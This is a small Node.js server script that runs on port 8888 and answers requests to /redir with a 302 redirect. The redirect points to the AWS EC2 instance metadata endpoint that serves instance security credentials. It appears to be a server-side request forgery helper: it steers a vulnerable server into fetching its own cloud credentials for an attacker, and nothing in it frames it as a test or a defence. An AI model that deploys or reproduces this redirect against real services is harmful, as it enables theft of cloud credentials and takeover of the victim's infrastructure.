const http = require("http");

const port = 8888;
const server = http.createServer((req, res) => {
  if (req.url == "/redir") {
    res.writeHead(302, {
      Location:
        "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
    });
    res.end();
    return;
  }
  res.writeHead(404, { "Content-Type": "text/plain" });
  res.end("Not Found\n");
});

server.listen(port, () => {
  console.log(`Server running at http://<your-public-ip>:${port}/`);
});
